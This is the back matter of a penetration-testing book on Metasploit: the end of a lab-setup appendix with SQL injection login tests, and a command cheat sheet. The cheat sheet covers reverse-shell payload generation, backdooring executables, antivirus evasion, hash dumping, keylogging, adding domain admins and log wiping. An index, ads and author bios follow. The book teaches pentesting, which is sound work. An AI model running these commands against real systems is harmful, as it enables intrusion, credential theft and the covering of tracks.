Open your browser and point to http://<youripaddress>/Default.aspx. You 
should see a log-in form, as shown in Figure A-5.
[Word Count: 19]

3.
Enter bogus credentials to verify that the SQL query is being executed 
properly. To test some basic SQL injection to identify whether the web 
application is functioning properly, enter a single quote (') in the user-
name field, and enter anything as the password (doesn’t matter). The 
application should produce a yellow page with a SQL-related error.
[Word Count: 58]

4.
Click the back arrow on your browser and enter OR 1=1-- and something 
(doesn’t matter) in the password field. You should see a “You have success-
fully logged on” message.
[Word Count: 31]

If you have gotten this far, everything is set up properly, and you are 
ready to plunge in.
[Word Count: 18]

As with any operating system, make sure you’re running the latest version of 
Back|Track and its tools. When logging into Back|Track (root/toor), issue the 
following commands:
[Word Count: 26]

root@bt:~# apt-get update && apt-get upgrade && apt-get dist-upgrade
[Word Count: 9]

This sequence of commands will select all available updates within 
Back|Track. After you have updated Back|Track by entering y (for yes) when 
prompted to accept the SVN certificate, your system still needs some minor 
updates to Metasploit, Fast-Track, and the SET.
[Word Count: 41]

X root@bt:~# cd /opt/framework3/msf3/
Y root@bt:/opt/framework3/msf3# msfupdate
[Word Count: 7]

Updated to revision XXXX.
Z root@bt:/opt/framework3/msf3# cd /pentest/exploits/set/
root@bt:/pentest/exploits/set# svn update
[Word Count: 11]

Updated to revision XXXX.
[ root@bt:/pentest/exploits/set# cd /pentest/exploits/fasttrack/
root@bt:/pentest/exploits/fasttrack# svn update
[Word Count: 11]

At revision XXXX.
root@bt:/pentest/exploits/fasttrack#
[Word Count: 4]

In Back|Track, Metasploit is located at /opt/framework3/msf3/ X, so 
change to that directory prior to updating the Framework via subversion 
with msfupdate Y.
Once Metasploit is updated, change to /pentest/exploits/set/ Z and run svn 
update. Lastly, change to /pentest/exploits/fasttrack/ [ and update Fast-Track.
You have now created and updated the testing environment that you will 
use as you work through the examples in this book.
[Word Count: 65]

Here is a reference for the most frequently used com-
mands and syntax within Metasploit’s various interfaces 
and utilities. See “Meterpreter Post Exploitation Com-
mands” on page 282 for some all-in-one commands 
that will make your life easier.
[Word Count: 38]

show exploits
Show all exploits within the Framework.
[Word Count: 8]

show payloads
Show all payloads within the Framework.
[Word Count: 8]

show auxiliary
Show all auxiliary modules within the Framework.
[Word Count: 9]

search name
Search for exploits or modules within the Framework.
[Word Count: 10]

info
Load information about a specific exploit or module.
[Word Count: 9]

use name
Load an exploit or module (example: use windows/smb/psexec).
[Word Count: 10]

LHOST
Your local host’s IP address reachable by the target, often the public IP 
address when not on a local network. Typically used for reverse shells.
[Word Count: 26]

set function
Set a specific value (for example, LHOST or RHOST).
[Word Count: 11]

setg function
Set a specific value globally (for example, LHOST or RHOST).
[Word Count: 12]

show options
Show the options available for a module or exploit.
[Word Count: 11]

show targets
Show the platforms supported by the exploit.
[Word Count: 9]

set target num
Specify a specific target index if you know the OS and service pack.
[Word Count: 16]

set payload payload
Specify the payload to use.
[Word Count: 8]

set autorunscript migrate -f
Automatically migrate to a separate process upon exploit completion.
[Word Count: 13]

check
Determine whether a target is vulnerable to an attack.
[Word Count: 10]

exploit
Execute the module or exploit and attack the target.
[Word Count: 10]

exploit -j
Run the exploit under the context of the job. (This will run the exploit 
in the background.)
[Word Count: 19]

exploit -z
Do not interact with the session after successful exploitation.
[Word Count: 11]

exploit -e encoder
Specify the payload encoder to use (example: exploit –e shikata_ga_nai).
[Word Count: 13]

exploit -h
Display help for the exploit command.
[Word Count: 8]

sessions -l
List available sessions (used when handling multiple shells).
[Word Count: 10]

sessions -l -v
List all available sessions and show verbose fields, such as which vulnera-
bility was used when exploiting the system.
[Word Count: 22]

sessions -s script
Run a specific Meterpreter script on all Meterpreter live sessions.
[Word Count: 13]

sessions -c cmd
Execute a command on all live Meterpreter sessions.
[Word Count: 11]

sessions -u sessionID
Upgrade a normal Win32 shell to a Meterpreter console.
[Word Count: 12]

db_create name
Create a database to use with database-driven attacks (example: db_create 
autopwn).
[Word Count: 13]

db_connect name
Create and connect to a database for driven attacks (example: db_connect 
autopwn).
[Word Count: 14]

db_nmap
Use nmap and place results in database. (Normal nmap syntax is supported, 
such as –sT –v –P0.)
[Word Count: 18]

db_autopwn -h
Display help for using db_autopwn.
[Word Count: 7]

db_autopwn -p -r -e
Run db_autopwn against all ports found, use a reverse shell, and exploit all 
systems.
[Word Count: 18]

db_destroy user:password@host:port/database
Delete database using advanced options.
[Word Count: 7]

run scriptname
Run Meterpreter-based scripts; for a full list check the scripts/meterpreter 
directory.
[Word Count: 13]

sysinfo
Show the system information on the compromised target.
[Word Count: 9]

ls
List the files and folders on the target.
[Word Count: 9]

use priv
Load the privilege extension for extended Meterpreter libraries.
[Word Count: 10]

ps
Show all running processes and which accounts are associated with each 
process.
[Word Count: 13]

migrate PID
Migrate to the specific process ID (PID is the target process ID gained 
from the ps command).
[Word Count: 19]

use incognito
Load incognito functions. (Used for token stealing and impersonation on 
a target machine.)
[Word Count: 15]

list_tokens -u
List available tokens on the target by user.
[Word Count: 10]

list_tokens -g
List available tokens on the target by group.
[Word Count: 10]

impersonate_token DOMAIN_NAME\\USERNAME
Impersonate a token available on the target.
[Word Count: 9]

steal_token PID
Steal the tokens available for a given process and impersonate that token.
[Word Count: 14]

drop_token
Stop impersonating the current token.
[Word Count: 6]

getsystem
Attempt to elevate permissions to SYSTEM-level access through multiple 
attack vectors.
[Word Count: 12]

shell
Drop into an interactive shell with all available tokens.
[Word Count: 10]

execute -f cmd.exe -i
Execute cmd.exe and interact with it.
[Word Count: 10]

execute -f cmd.exe -i -t
Execute cmd.exe with all available tokens.
[Word Count: 11]

execute -f cmd.exe -i -H -t
Execute cmd.exe with all available tokens and make it a hidden process.
[Word Count: 18]

rev2self
Revert back to the original user you used to compromise the target.
[Word Count: 13]

reg command
Interact, create, delete, query, set, and much more in the target’s registry.
[Word Count: 14]

setdesktop number
Switch to a different screen based on who is logged in.
[Word Count: 13]

screenshot
Take a screenshot of the target’s screen.
[Word Count: 8]

upload file
Upload a file to the target.
[Word Count: 8]

download file
Download a file from the target.
[Word Count: 8]

keyscan_start
Start sniffing keystrokes on the remote target.
[Word Count: 8]

keyscan_dump
Dump the remote keys captured on the target.
[Word Count: 9]

keyscan_stop
Stop sniffing keystrokes on the remote target.
[Word Count: 8]

getprivs
Get as many privileges as possible on the target.
[Word Count: 10]

uictl enable keyboard/mouse
Take control of the keyboard and/or mouse.
[Word Count: 10]

background
Run your current Meterpreter shell in the background.
[Word Count: 9]

sniffer_interfaces
List the available interfaces on the target.
[Word Count: 8]

sniffer_dump interfaceID pcapname
Start sniffing on the remote target.
[Word Count: 9]

sniffer_start interfaceID packet-buffer
Start sniffing with a specific range for a packet buffer.
[Word Count: 13]

sniffer_stats interfaceID
Grab statistical information from the interface you are sniffing.
[Word Count: 11]

sniffer_stop interfaceID
Stop the sniffer.
[Word Count: 5]

add_user username password -h ip
Add a user on the remote target.
[Word Count: 12]

add_group_user "Domain Admins" username -h ip
Add a username to the Domain Administrators group on the remote target.
[Word Count: 18]

clearev
Clear the event log on the target machine.
[Word Count: 9]

timestomp
Change file attributes, such as creation date (antiforensics measure).
[Word Count: 10]

msfpayload windows/meterpreter/bind_tcp O
List available options for the windows/meterpreter/bind_tcp payload (all of 
these can use any payload).
[Word Count: 17]

msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=443 X > 
payload.exe
Create a Meterpreter reverse_tcp payload to connect back to 192.168.1.5 
and on port 443, and then save it as a Windows Portable Executable 
named payload.exe.
[Word Count: 32]

msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=443 R > 
payload.raw
Same as above, but export as raw format. This will be used later in 
msfencode.
[Word Count: 22]

msfpayload windows/meterpreter/bind_tcp LPORT=443 C > payload.c
Same as above but export as C-formatted shellcode.
[Word Count: 14]

msfpayload windows/meterpreter/bind_tcp LPORT=443 J > payload.java
Export as %u encoded JavaScript.
[Word Count: 11]

msfencode -h
Display the msfencode help.
[Word Count: 6]

msfencode -l
List the available encoders.
[Word Count: 6]

msfencode -t (c, elf, exe, java, js_le, js_be, perl, raw, ruby, vba, vbs, 
loop-vbs, asp, war, macho)
Format to display the encoded buffer.
[Word Count: 23]

msfencode -i payload.raw -o encoded_payload.exe -e x86/shikata_ga_nai -c 5 
-t exe
Encode payload.raw with shikata_ga_nai five times and export it to an 
output file named encoded_payload.exe.
[Word Count: 26]

msfpayload windows/meterpreter/bind_tcp LPORT=443 R | msfencode -e x86/
_countdown -c 5 -t raw | msfencode -e x86/shikata_ga_nai -c 5 -t exe -o 
multi-encoded_payload.exe
Create a multi-encoded payload.
[Word Count: 27]

msfencode -i payload.raw BufferRegister=ESI -e x86/alpha_mixed -t c
Create pure alphanumeric shellcode where ESI points to the shellcode; 
output in C-style notation.
[Word Count: 22]

msfcli | grep exploit
Show only exploits.
[Word Count: 7]

msfcli | grep exploit/windows
Show only Windows exploits.
[Word Count: 8]

msfcli exploit/windows/smb/ms08_067_netapi PAYLOAD=windows/meterpreter/bind_tcp 
LPORT=443 RHOST=172.16.32.142 E
Launch ms08_067_netapi exploit at 172.16.32.142 with a bind_tcp payload 
being delivered to listen on port 443.
[Word Count: 22]

msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=443 R | 
msfencode -x calc.exe -k -o payload.exe -e x86/shikata_ga_nai -c 7 -t exe
Create a reverse Meterpreter payload connecting back to 192.168.1.5 
on port 443 using calc.exe as a template to backdoor. Keep execution 
flow within the application for it to continue to work, and output the 
shikata_ga_nai encoded payload to payload.exe.
[Word Count: 57]

msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=443 R | 
msfencode -x calc.exe -o payload.exe -e x86/shikata_ga_nai -c 7 -t exe
Create a reverse Meterpreter payload connecting back to 192.168.1.5 on 
port 443 using calc.exe as a template to backdoor. Does not keep execu-
tion flow within the application and will not prompt anything back to the 
end user when it is executed. This is useful when you have remote access 
via a browser exploit and don’t want the calculator application popping 
up to the end user. Also outputs the shikata_ga_nai encoded payload to 
payload.exe.
[Word Count: 91]

msfpayload windows/meterpreter/bind_tcp LPORT=443 R | msfencode -o payload.exe 
-e x86/shikata_ga_nai -c 7 -t exe && msfcli multi/handler PAYLOAD=windows/
meterpreter/bind_tcp LPORT=443 E
Create a bind_tcp Meterpreter payload in raw format, encode it seven 
times using shikata_ga_nai, output it in Windows portable executable for-
mat with a name of payload.exe, and then have a multi-handler listening 
for it to execute.
[Word Count: 58]

Leverage msfvenom, an all-in-one suite, to create and encode your payload:
[Word Count: 11]

msfvenom --payload
windows/meterpreter/reverse_tcp --format exe --encoder x86/shikata_ga_nai 
LHOST=172.16.1.32 LPORT=443 > msf.exe
[*] x86/shikata_ga_nai succeeded with size 317 (iteration=1)
root@bt://opt/framework3/msf3#
[Word Count: 19]

This one liner will create a payload and automatically generate it in an 
executable format.
[Word Count: 15]

Elevate your permissions on Windows-based systems using Meterpreter:
[Word Count: 8]

meterpreter > use priv
meterpreter > getsystem
[Word Count: 7]

Steal a domain administrator token from a given process ID, add a 
domain account, and then add it to the Domain Admins group:
[Word Count: 23]

meterpreter > steal_token 1784
meterpreter > shell
[Word Count: 7]

C:\Windows\system32>net user metasploit p@55w0rd /ADD /DOMAIN
C:\Windows\system32>net group "Domain Admins" metasploit /ADD /DOMAIN
[Word Count: 13]

Dump password hashes from the SAM database:
[Word Count: 7]

meterpreter > use priv
meterpreter > getsystem
meterpreter > hashdump
[Word Count: 10]

NOTE
On Win2k8 you may need to migrate to a process that is running as SYSTEM if 
getsystem and hashdump throw exceptions.
[Word Count: 22]

Kill antivirus processes running on the target via the killav Meterpreter 
script:
[Word Count: 12]

Capture keystrokes on target machines from within a particular process:
[Word Count: 10]

meterpreter > ps
meterpreter > migrate 1436
meterpreter > keyscan_start
meterpreter > keyscan_dump
meterpreter > keyscan_stop
[Word Count: 16]

Use Incognito to impersonate an administrator:
[Word Count: 6]

meterpreter > use incognito
meterpreter > list_tokens -u
meterpreter > use priv
meterpreter > getsystem
[Word Count: 15]

meterpreter > list_tokens -u
meterpreter > impersonate_token IHAZSECURITY\\Administrator
[Word Count: 8]

See what protection mechanisms are in place on the compromised 
target, display the help menu, disable Windows Firewall, and kill all counter-
measures found:
[Word Count: 24]

meterpreter > run getcountermeasure
meterpreter > run getcountermeasure -h
meterpreter > run getcountermeasure -d -k
[Word Count: 15]

Identify whether the compromised system is a virtual machine:
[Word Count: 9]

Drop into a command shell for a current Meterpreter console session:
[Word Count: 11]

Get a remote GUI (VNC) on the target machine:
[Word Count: 9]

Background a currently running Meterpreter console:
[Word Count: 6]

meterpreter > run post/windows/escalate/bypassuac
[Word Count: 4]

meterpreter > run post/osx/gather/hashdump
[Word Count: 4]

meterpreter > run post/linux/gather/hashdump
[Word Count: 4]

Arduino interface, 159
armitage, 11–12
ARP (Address Resolution Protocol), 
175–176
assembly languages, 216
attack vectors, 17, 136
Attempt SQL Ping and Auto Quick 
Brute Force option, Fast-Track, 
169–171
Aurora attack vector, 146
Authentication Mode, SQL Server, 270
autoexploit.rc file, 73
Automatic Targeting option, 62
Automatic Updates option, 
Windows XP, 269
Autopwn Automation menu, 164
autopwn exploits, 181
Autopwn tool, using results in, 56
autorun.inf file, 157
auxiliary class, 129
auxiliary modules, 123–133
anatomy of, 128–133
defined, 8
in use, 126–128
Auxiliary run method, 31
Auxiliary::Scanner mixin, 31
[Word Count: 87]

back command, 58
backdoored executable, 106
background command, 86, 279
Back|Track
downloading, 267–268
updating, 272–274
bad characters
avoiding, 13
and creating exploits, 210–213
banner grabbing, 19, 36
[Word Count: 27]

captive portal, Karmetasploit, 182
check command, 276
Check Names button, Login-New 
window, 272
CIDR (Classless Inter-Domain Routing) 
notation, 22, 44
clearev command, 279
client.framework.payloads.create(payload) 
function, 246
client-side attacks, 109–121
browser-based exploits, 110–112
file format exploits, 119–120
[Word Count: 36]

CTRL-Z shortcut, 86, 97
custom scanners, for intelligence 
gathering, 31–33
CVE (Common Vulnerabilities and 
Exposures) numbers, 42
[Word Count: 17]

Dai Zovi, Dino, 177
databases, working with in Metasploit, 
20–25
Data Execution Prevention (DEP), 65
data/templates/template.exe template, 105
[Word Count: 18]

eb operation code, 209
egg hunter, 204
EHLO command, 219
EIP (extended instruction pointer) 
register, 216, 217, 219, 220
Encase, 265
-EncodedCommand command, 193, 194
encoders, 13
endian-ness, 207, 221
[Word Count: 30]

Gates, Chris, 129
generate_seh_payload function, 230
generic/debug_trap payload, 208, 220
getgui script, 257
GET HTTP request, 36
getprivs command, 279
getsystem command, 86, 119, 249, 
278, 282
getuid command, 86
Google, to identify potential 
vulnerabilities, 260
[Word Count: 36]

h2b conversion method, 193
Hadnagy, Chris, 135
hashdump command, 83, 84, 93, 95, 
279, 282
hashdump post exploitation module, 82
haystack, 111
heap, 111
heap-based attack, 70
heap spraying technique, 111
help command, 9, 43, 80, 277
hex-blob, 185
host_process.memory.allocate function, 238
host_process.memory.write function, 239
host_process.thread.create function, 239
HTTP (HyperText Transfer Protocol)
man-left-in-the-middle attack, 150
PUT command, 264
PUT method, 261
HVE, Patrick, 97
HyperText Transfer Protocol (HTTP). 
See HTTP (Hyper Text Trans-
fer Protocol)
[Word Count: 75]

ICMP (Internet Control Message 
Protocol), 19
IDS (intrusion detection systems), 13, 
18, 229
idx counter, 194
iexplorer.exe, 113, 117, 237
iframe injection, 147
iframe replacement, 151
IIS (Internet Information Server), 269
IMAP (Internet Message Access Proto-
col) fuzzer, 198
[Word Count: 39]

Internet Message Access Protocol 
(IMAP) fuzzer, 198
intrusion detection systems (IDS), 13, 
18, 229
intrusion prevention system (IPS), 18, 
110, 252
IP address, using Netcraft to find, 17
ipidseq scan, 22
IPS (intrusion prevention system), 18, 
110, 252
irb command, 241, 242
irb shell, 97
is_admin?() function, 243
is_uac_enabled?() function, 243
ISO disc image, VMware Player, 268
[Word Count: 57]

Java applet attack, 136, 142–146, 
153–154, 156
Java Applet Attack Method option, SET 
main menu, 144, 154
Java Development Kit (JDK), Java applet 
attack, 136
JavaScript output, 12
JDK (Java Development Kit), Java applet 
attack, 136
jduck, 79
JMP ESP address, 221
jmp esp command, 14
JMP instruction set, 216
[Word Count: 50]

KARMA, 177–178
karma.rc file, 178, 182
Karmetasploit, 177–184
configuring, 178–179
credential harvesting, 181–182
getting shell, 182–184
launching attack, 179–181
Kelley, Josh, 185
Kennedy, David, 79, 135, 163, 185, 248
Kerberos token, 87, 89
keylog_recorder module, 82
keystroke logging, for Meterpreter, 
81–82
keyscan_dump command, 279
keyscan_start command, 279
keyscan_stop command, 279
keystrokes, capturing, 282
Killav, 93, 282
[Word Count: 56]

Macaulay, Shane, 177
MailCarrier 2.51 SMTP commands, 216
mailcarrier_book.rb file, 220
MailCarrier exploit, 218
make_nops() function, 223
malicious ActiveX control, 184
malicious files, 119
Management and Monitoring Tools 
checkbox, Windows Components 
Wizard, 269
man-left-in-the-middle attack, 150
mass brute force attack, 
SQLPwnage, 172
mass client-side attack, 175–176
mass emails, 142
mass scan and dictionary brute option, 
Fast-Track, 169
McAfee antivirus software, 80
MD5 checksum, 242
Melvin, John, 163
Memelli, Matteo, 197
[Word Count: 70]

MSSQL Injector option, 165
mssql_login module, 78–79
mssql_payload exploit, and 
PowerShell, 189
mssql_payload module, 79–80
mssql_ping module, 27, 77–78
mssql_powershell module, 185
mssql_powershell.rb file, 189, 191, 195
mssql.rb file, 188, 191, 192, 195
Mudge, Raphael, 11
multi-attack vector, 153–157
Multi-Attack Web Method option, SET 
main menu, 154
multi-encoding, 103–104
multi-handler, Meterpreter sessions, 239
multi-handler listener, 120
multi/handler module, 100–101, 249
multi/http/tomcat_mgr_deploy exploit, 261
multi_meter_inject command, 235, 237
Muts, 226
[Word Count: 69]

Nano, CTRL-W shortcut, 188
nasm shell, 13–14
nasm_shell.rb utility, 13
NAT (Network Address Translation), 25
Nessus, 44–51
Add button, 45, 47
Bridge plug-in, 49–50
Browse button, 47
configuring, 44–45
creating scan policy, 45–47
Discovered Assets section, 40
General settings, 46
Home Feed, 44
importing report from, 48–49
Launch Scan button, 47
nessus_connect command, 50
.nessus file format, 48
nessus_help command, 49
nessus_report_get command, 50
nessus_report_list command, 50
nessus_scan_new command, 50
nessus_scan_status command, 50
Nessus window, 44–45
Plugins page, 46
Policies tab, 45
Preferences page, 47
reports in, 47–48
running scan, 47
scanning from within Metasploit, 
49–51
[Word Count: 96]

Next SEH (NSEH), 204, 208–209, 229
nmap, 168, 257–259
idle scan, 22, 23
importing results into Metasploit, 
21–22
-Pn flag, nmap, 19
port scanning with, 18–20, 76
running from msfconsole, 24–25
scan, 252
script options, 64–65
TCP idle scan, 22–23
No Execute (NX), 67
noncredentialed scan, 43
NOP (no-operation instruction), 111, 
204, 209, 216, 219
Notepad, 239–240
notepad.exe, 156
NSEH (Next SEH), 204, 208–209, 229
nslookup, passive information gathering 
using, 18
NT AUTHORITY\SYSTEM server user-
name, 86
NTLM (NT LAN Manager), 82, 83
NTLMv2 (NT LAN Manager v2), 82
NX (No Execute), 67
[Word Count: 93]

Offset value, 223
oledlg.dll file, 230
opcodes, 13
Open option, Immunity Debugger, 113
open source intelligence (OSINT), 16
OpenSSH, 28, 259
Open Table option, SQL Server Man-
agement Studio Express, 272
open_x11 scanner, 54–55
opt/framework3/msf3/lib/rex/post/
meterpreter/ui/console/
command_dispatcher/ 
directory, 242
OSINT (open source intelligence), 16
OS X system
dumping hashes on, 283
VMware Player, 268
overt penetration testing, 4, 5
overwrite exploits, for SEH, 226–232
[Word Count: 64]

packers, 107–108
packetrecorder command, 93
passing password hashes, 84–85
[Word Count: 9]

PureBasic language, 54
PUT method, HTTP, 261, 264
PuTTY Windows SSH client, 106
[Word Count: 13]

query string attack, Microsoft SQL 
injection, 165–166
Query String Parameter Attack 
option, 165
Quick TFTP Pro 2.1, 226
[Word Count: 18]

sa (system administrator) account, 77, 
79, 168, 186
SAM (Security Account Manager) data-
base, 83, 282
Samba exploit, 69, 90
save command, 64
scanner/ftp/ anonymous module, anony-
mous logins, 29
scanner/http modules, 126
scanner/ip/ipidseq module, 22
scanner mixin, 31
scanner/portscan/syn module, 257
scanner/portscan/tcp module, 91, 257
[Word Count: 46]

SHIFT-F9 shortcut, in Immunity 
Debugger, 208
shikata_ga_nai encoder, 103, 104, 281
show command, 58-63, 65, 56, 67, 68, 
118, 124, 191, 275, 276
show_options command, 51
-sI  flag, 23
signatures, 99
Simple Mail Transport Protocol 
(SMTP), 137, 260
[Word Count: 38]

svn update command, 274
SYN Port Scanner, 25
sysadmin role, 186
sysinfo command, 81, 277
SYSTEM-level permissions, 79
[Word Count: 18]

THREADS number option, 27
THREADS option, 126
THREADS value, 22–23, 25, 125
threat modeling
phase of PTES, 2–3
simulated penetration test, 253–255
three-byte overwrite, of SEH, 207
time-based iframe replacement, 151
timestomp command, 264, 279
token impersonation, with Meterpreter, 
87–89
toor password, in PostgreSQL 
database, 20
Total size value, 205
Transmission Control Protocol (TCP). 
See TCP (Transmission Control 
Protocol)
Trivial File Transfer Protocol (TFTP), 
228–231
Trojan backdoor, 125
Turn off Automatic Updates option, 
Windows XP, 269
Twitter, auxiliary module, 129
types of penetration testing, 4–5
[Word Count: 85]

UAC (User Account Control), 243, 248
Ubuntu, 68–71, 259–260, 267–268
UDP (User Datagram Protocol)
port 69, 228
port 1434, 27, 77, 168
uictl enable keyboard/mouse 
command, 279
unset command, 63
unsetg command, 64
upgrading command shell, to 
Meterpreter, 95–97
upload file command, 279
UPX packer, 107–108
URIPATH option, 117
usage function, 238
use command, 51, 60, 125, 126, 132, 249
use incognito command, 88, 278
use multi/handler command, 94
use name command, 276
use priv command, 83, 86, 119, 278
use scanner/http/webdav_scanner 
command, 125
use scanner/mssql/mssql_ping 
command, 78
use scanner/portscan/syn command, 25
[Word Count: 92]

use scanner/snmp/snmp_login module, 30
use sniffer command, 279
Use them all - A.K.A. 'Tactical Nuke' 
option, SET main menu, 154
use windows/smb/ms08_067_netapi 
command, 59
UsePowerShell method, 190, 191
User Account Control (UAC), 243, 248
User Datagram Protocol (UDP). See 
UDP (User Datagram Protocol)
User Mapping option, User Properties 
window, 272
User Properties window, 272
user32.dll, 97
username harvesting, 148–150
utilities, for Metasploit, 12–14
msfencode, 13
msfpayload, 12–13
nasm shell, 13–14
[Word Count: 70]

variables, using uppercase characters, 63
VBScript, 95
VenueID, 132
version command, 72
virtual network computing (VNC) 
authentication, 52–54
VMware Player, 268
.vmx file, 268
VNC (remote GUI), getting, 283
VNC (virtual network computing) 
authentication, 52–54
vnc_none_auth command, 53
vncviewer, connecting to VNC with no 
authentication, 53
VNC window, 92
vulnerability scanning, 35–73
defined, 5
with Nessus, 44–51
configuring, 44–45
creating scan policy, 45–47
importing report from, 48–49
reports in, 47–48
running scan, 47
scanning from within Metasploit, 
49–51
with NeXpose, 37–44
configuring, 37–42
importing report from, 42–43
running within msfconsole, 43–44
for open VNC authentication, 52–54
[Word Count: 96]

for open X11 servers, 54–56
overview, 36–37
phase of PTES, 3
using results in Autopwn tool, 56
for valid SMB logins, 51–52
vulnerable services, identifying, 259–260
[Word Count: 26]

Windows virtual machine, scanning, 21
Windows XP, 76–82
attacking MS SQL, 76–78
brute forcing MS SQL server, 78–79
exploitation for, 64–68
nmap scan against, 19
scanning for ports with nmap, 76
scanning only one system, 27
as target machine, 269–274
configuring web server on, 269
creating vulnerable web applica-
tion, 271–272
MS SQL server on, 269–271
updating Back|Track, 272–274
xp_cmdshell, 79–80
windows/meterpreter/reverse_tcp 
payload, 246
windows/shell_reverse_tcp payload, 100
windows/smb/ms08_067_netapi exploit, 
59, 67
windows/smb/psexec module, 84–85
wireless attack vector, 160–161
wireless card, 179
WMI (Windows Management 
Interface), 269
WScript file, 157
WSCRIPT HTTP GET MSF Payload option, 
SET main menu, 158
[Word Count: 99]

X11 servers, vulnerability scanning for, 
54–56
x86/shikata_ga_nai encoder, 13, 103
x90, Intel x86 architecture, 112
xCCs breakpoints, 208
xp_cmdshell stored procedure, 79–80, 
166, 169, 172, 186, 187, 188, 
255, 257
xspy tool, 55–56
XSS (cross-site scripting) 
vulnerability, 150
xterm window, 256
[Word Count: 41]

Zate, 49
zero-day vulnerability, Adobe Flash, 
110, 146
[Word Count: 8]

Metasploit is set in New Baskerville, TheSansMono Condensed, Futura, 
and Dogma.
This book was printed and bound at Malloy Incorporated in Ann 
Arbor, Michigan. The paper is Glatfelter Spring Forge 60# Antique, which 
is certified by the Sustainable Forestry Initiative (SFI). The book uses a 
RepKover binding, which allows it to lie flat when open.
[Word Count: 55]

The Electronic Frontier Foundation (EFF) is the leading 
organization defending civil liberties in the digital world. We defend 
free speech on the Internet, fight illegal surveillance, promote the 
rights of innovators to develop new digital technologies, and work to 
ensure that the rights and freedoms we enjoy are enhanced — 
rather than eroded — as our use of technology grows.
[Word Count: 60]

EFF has sued telecom giant AT&T for giving the NSA unfettered access to the 
private communications of millions of their customers. eff.org/nsa
[Word Count: 22]

EFF’s Coders’ Rights Project is defending the rights of programmers and security 
researchers to publish their findings without fear of legal challenges. 
eff.org/freespeech
[Word Count: 23]

EFF's Patent Busting Project challenges overbroad patents that threaten 
technological innovation. eff.org/patent
[Word Count: 12]

EFF is fighting prohibitive standards that would take away your right to receive and 
use over-the-air television broadcasts any way you choose.  eff.org/IP/fairuse
[Word Count: 23]

EFF has developed the Switzerland Network Testing Tool to give individuals the tools 
to test for covert traffic filtering. eff.org/transparency
[Word Count: 20]

EFF is working to ensure that international treaties do not restrict our free speech, 
privacy or digital consumer rights. eff.org/global
[Word Count: 20]

EFF is a member-supported organization. Join Now!  www.eff.org/support
[Word Count: 8]

More no-nonsense books from 
 NO STARCH PRESS
[Word Count: 7]

THE IDA PRO BOOK, 
2ND EDITION
The Unofficial Guide to the World's 
Most Popular Disassembler
by CHRIS EAGLE
JUNE 2011, 672 PP., $69.95
ISBN 978-1-59327-289-0
[Word Count: 25]

GRAY HAT PYTHON
Python Programming for Hackers 
and Reverse Engineers
by JUSTIN SEITZ
APRIL 2009, 216 PP., $39.95
ISBN 978-1-59327-192-3
[Word Count: 20]

THE TANGLED WEB
Securing Modern Web Applications
by MICHAL ZALEWSKI
SEPTEMBER 2011, 400 PP., $39.95
ISBN 978-1-59327-388-0
[Word Count: 17]

HACKING, 2ND EDITION
The Art of Exploitation
by JON ERICKSON
FEBRUARY 2008, 488 PP. W/CD, $49.95
ISBN 978-1-59327-144-2
[Word Count: 18]

PRACTICAL PACKET 
ANALYSIS, 2ND EDITION
Using Wireshark to Solve 
Real-World Network Problems
by CHRIS SANDERS
JULY 2011, 280 PP., $49.95
ISBN 978-1-59327-266-1
[Word Count: 22]

THE LINUX PROGRAMMING 
INTERFACE
A Linux and UNIX
® System 
Programming Handbook
by MICHAEL KERRISK
OCTOBER 2010, 1552 PP., $99.95, hardcover
ISBN 978-1-59327-220-3
[Word Count: 23]

Visit http://nostarch.com/metasploit.htm for updates, errata, and more.
[Word Count: 7]

MONDAY THROUGH FRIDAY,
9 A.M. TO 5 P.M. (PST)
[Word Count: 9]

David Kennedy is Chief Information Security Officer at Diebold Incorporated 
and creator of the Social-Engineer Toolkit (SET), Fast-Track, and other open 
source tools. He is on the Back|Track and Exploit Database development 
team and is a core member of the Social-Engineer podcast and framework. 
Kennedy has presented at a number of security conferences including 
Black Hat, Defcon, ShmooCon, Security B-Sides, and more.
[Word Count: 62]

Jim O’Gorman is a professional penetration tester with CSC’s StrikeForce, 
a co-founder of Social-Engineer.org, and an instructor at Offensive-Security. 
He is involved in digital investigations and malware analysis, and helped build 
forensic capabilities into Back|Track Linux. When not working on various 
security issues, Jim spends his time assisting his children in their attempts 
to fight Zombie hordes.
[Word Count: 57]

Devon Kearns is an instructor at Offensive-Security, a Back|Track Linux 
developer, and administrator of The Exploit Database. He has contributed 
a number of Metasploit exploit modules and is the maintainer of the Meta-
sploit Unleashed wiki.
[Word Count: 36]

Mati Aharoni is the creator of the Back|Track Linux distribution and founder 
of Offensive-Security, the industry leader in security training.
[Word Count: 20]

The Metasploit Framework makes discovering, 
exploiting, and sharing vulnerabilities quick and 
relatively painless. But while Metasploit is used by 
security professionals everywhere, the tool can be 
hard to grasp for first-time users. Metasploit: The 
Penetration Tester’s Guide fills this gap by teaching you 
how to harness the Framework and interact with the 
vibrant community of Metasploit contributors.
[Word Count: 57]

Once you’ve built your foundation for penetration 
testing, you’ll learn the Framework’s conventions, 
interfaces, and module system as you launch simulated 
attacks. You’ll move on to advanced penetration testing 
techniques, including network reconnaissance and 
enumeration, client-side attacks, wireless attacks, and 
targeted social-engineering attacks.
[Word Count: 43]

 Find and exploit unmaintained, misconfigured, and 
unpatched systems
[Word Count: 9]

 Perform reconnaissance and find valuable 
information about your target
[Word Count: 10]

 Bypass antivirus technologies and circumvent 
security controls
[Word Count: 8]

 Integrate Nmap, NeXpose, and Nessus with 
Metasploit to automate discovery
[Word Count: 11]

 Use the Meterpreter shell to launch further 
attacks from inside the network
[Word Count: 13]

 Harness stand-alone Metasploit utilities, third-
party tools, and plug-ins
[Word Count: 10]

 Learn how to write your own Meterpreter post-
exploitation modules and scripts
[Word Count: 13]

You’ll even touch on exploit discovery for zero-day 
research, write a fuzzer, port existing exploits into the 
Framework, and learn how to cover your tracks. Whether 
your goal is to secure your own networks or to put 
someone else’s to the test, Metasploit: The Penetration 
Tester’s Guide will take you there and beyond.
[Word Count: 53]

“The best guide to the 
Metasploit Framework.” — HD Moore, 
Founder of the Metasploit Project
[Word Count: 15]

$49.95 ($57.95 CDN)	
Shelve In: Computers/Internet/Security
[Word Count: 6]

THE FINEST IN GEEK ENTERTAINMENT™
www.nostarch.com
 “I LAY FLAT.” This book uses RepKover — a durable binding that won’t snap shut.
[Word Count: 21]

Total Paragraphs: 1705